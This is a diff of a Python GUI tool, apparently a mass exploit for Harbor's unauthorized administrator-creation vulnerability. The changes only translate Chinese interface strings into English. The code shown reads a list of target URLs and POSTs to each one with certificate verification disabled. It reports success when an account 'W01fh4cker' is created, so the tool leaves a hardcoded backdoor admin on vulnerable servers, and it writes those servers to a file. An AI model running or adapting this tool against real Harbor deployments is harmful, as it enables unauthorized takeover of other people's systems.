@@ -16,25 +16,25 @@ def harbor_exp(url):
         requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
         resp = requests.post(url=url, data=data, headers=headers, verify=False, timeout=5)
         if resp.status_code == 201:
-            harbor_text.insert(END, "---------------------------------\n【！！！！！！】存在漏洞的url：" + url + "；成功创建账号:W01fh4cker 密码:W01fh4cker。" + "\n---------------------------------\n")
+            harbor_text.insert(END, "---------------------------------\n[! ! ! ! ! ! ] Vulnerable url:" + url + "; Successfully created account: W01fh4cker Password: W01fh4cker." + "\n---------------------------------\n")
             harbor_text.see(END)
-            with open("存在Harbor 未授权创建管理员漏洞的url.txt", 'a') as f:
+            with open("[exists]harbor_unauthorized_create_account_url.txt", 'a') as f:
                 f.write(url + "\n")
         else:
-            harbor_text.insert(END, "【×】不存在漏洞的url：" + url + "\n")
+            harbor_text.insert(END, "[×]URL without vulnerability:" + url + "\n")
             harbor_text.see(END)
     except Exception as err:
-        harbor_text.insert(END, "【×】目标请求失败，报错内容：" + str(err) + "\n")
+        harbor_text.insert(END, "[×]The target request failed, and the error content:" + str(err) + "\n")
         harbor_text.see(END)
 def get_harbor_addr():
-    with open("修正后的url.txt","r") as f:
+    with open("corrected url.txt","r") as f:
         for address in f.readlines():
             address = address.strip()
             yield address
 def harbor_gui():
     harbor = Toplevel()
     harbor.geometry("1035x455")
-    harbor.title("Harbor 未授权创建管理员漏洞一把梭")
+    harbor.title("Harbor unauthorized to create administrator [auto-muti-exp]")
     harbor.resizable(0, 0)
     logo = PhotoImage(file="./logo.ico")
     harbor.tk.call('wm', 'iconphoto', harbor._w, logo)
